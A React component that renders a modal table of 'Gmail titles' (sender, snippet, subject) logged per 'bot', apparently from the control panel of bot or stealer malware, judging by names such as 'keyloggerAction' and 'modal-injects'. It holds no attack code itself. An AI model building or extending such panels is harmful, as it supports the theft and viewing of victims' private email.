import React, {useLayoutEffect, useRef} from "react";
import {ModalsProps} from "../../../Model/Modal";
import {Button, Modal, Space, Table} from "antd";
import {Bot} from "../../../Model/Bot";
import {AppState} from "../../../Store/RootReducer";
import {getLogsList} from "../../../Store/Logs/Actions";
import {RedoOutlined} from "@ant-design/icons";
import {useTranslation} from "react-i18next";
import {useAppDispatch} from "../../../Hook/useAppDispatch";
import {useAppSelector} from "../../../Hook/useAppSelector";

interface GmailTitlesLog {
    i: number,
    sender: string,
    snippet: string,
    subject: string,
}

interface GmailTitlesProps extends ModalsProps {
    bot: Bot,
}

const GmailTitles: React.FC<GmailTitlesProps> = (props: GmailTitlesProps) => {
    const dispatch = useAppDispatch();
    const logsReducer = useAppSelector((state: AppState) => state.logs);
    const tableRef = useRef<HTMLDivElement>(null);
    const {t} = useTranslation();

    useLayoutEffect(() => {
        if (props.visible) {
            dispatch(getLogsList("gmail_mes", props.bot.id, null, logsReducer.filters, logsReducer.sort, logsReducer.page, logsReducer.per_page));
        }
    }, [dispatch, props.bot.id, props.visible, logsReducer.page, logsReducer.per_page, logsReducer.filters.keyloggerAction]);


    const closeModal = () => {
        props.setVisible(false);
    };


    const refresh = () => {
        dispatch(getLogsList("gmail_mes", props.bot.id, null, logsReducer.filters, logsReducer.sort, 1));
    };

    const columns = [
        {
            title: t("NUMBER"),
            dataIndex: "i",
            key: "i",
            render: (text: string, log: GmailTitlesLog) => (
                <div className="table-col">
                    <div className="table-col-item">
                        <b>{t("NUMBER")}</b>
                    </div>
                    <div className="table-col-item">
                        {log.i}
                    </div>
                </div>
            ),
        },
        {
            title: t("SENDER"),
            dataIndex: "sender",
            key: "sender",
            render: (text: string, log: GmailTitlesLog) => (
                <div className="table-col">
                    <div className="table-col-item">
                        <b>{t("SENDER")}</b>
                    </div>
                    <div className="table-col-item">
                        {log.sender}
                    </div>
                </div>
            ),
        },
        {
            title: t("SNIPPET"),
            dataIndex: "snippet",
            key: "snippet",
            render: (text: string, log: GmailTitlesLog) => (
                <div className="table-col">
                    <div className="table-col-item">
                        <b>{t("SNIPPET")}</b>
                    </div>
                    <div className="table-col-item">
                        {log.snippet}
                    </div>
                </div>
            ),
        },
        {
            title: t("SUBJECT"),
            dataIndex: "subject",
            key: "subject",
            render: (text: string, log: GmailTitlesLog) => (
                <div className="table-col">
                    <div className="table-col-item">
                        <b>{t("SUBJECT")}</b>
                    </div>
                    <div className="table-col-item">
                        {log.subject}
                    </div>
                </div>
            ),
        },
    ];

    let dataSource: GmailTitlesLog[];

    if (logsReducer.logs.length > 0) {
        dataSource = (logsReducer.logs[0].log) as unknown as GmailTitlesLog[];
    } else {
        dataSource = [];
    }

    const isLoaded = logsReducer.isLoaded && logsReducer.type === "gmail_mes" && logsReducer.botId === props.bot.id;

    return (
        <Modal
            title={t("GMAIL_TITLES")}
            className="modal-injects"
            open={props.visible}
            onCancel={closeModal}
            width={600}
            destroyOnClose
            footer={[
                <>
                    <Button
                        type="primary"
                        onClick={refresh}
                        icon={<RedoOutlined />}
                    >
                        {t("REFRESH")}
                    </Button>
                    <Button
                        type="primary"
                        onClick={closeModal}
                        danger
                    >
                        {t("MODAL_BUTTON_CANCEL")}
                    </Button>
                </>,
            ]}
        >
            <div className="table-scroll" style={{maxHeight: 600, overflowY: "auto"}} ref={tableRef}>
                <Table
                    columns={columns}
                    dataSource={isLoaded ? dataSource : []}
                    size="small"
                    pagination={false}
                    sticky={true}
                    className="not-responsive"
                    loading={!isLoaded}
                    locale={{
                        emptyText: (
                            <Space>
                                <i className="fa-solid fa-robot" /> {t("TABLE_EMPTY")}
                            </Space>
                        ),
                    }}
                />
            </div>
        </Modal>
    );
};

export default GmailTitles;
